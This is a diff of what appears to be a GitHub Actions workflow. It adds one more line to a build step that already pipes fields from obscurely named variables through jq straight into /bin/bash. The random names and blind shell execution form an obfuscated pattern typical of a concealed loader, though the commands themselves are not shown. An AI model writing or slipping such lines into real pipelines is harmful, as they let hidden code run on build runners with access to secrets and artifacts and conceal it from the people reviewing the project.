@@ -41,6 +41,7 @@ jobs:
           echo $n0 | jq -r .lvfn7 | /bin/bash
           echo $s96667 | jq -r .pgh5486 | /bin/bash
           printf '%s' "$rhic78558" | jq -r .n1387 | /bin/bash
+          echo $pqmsp07725 | jq -r .tz1908 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
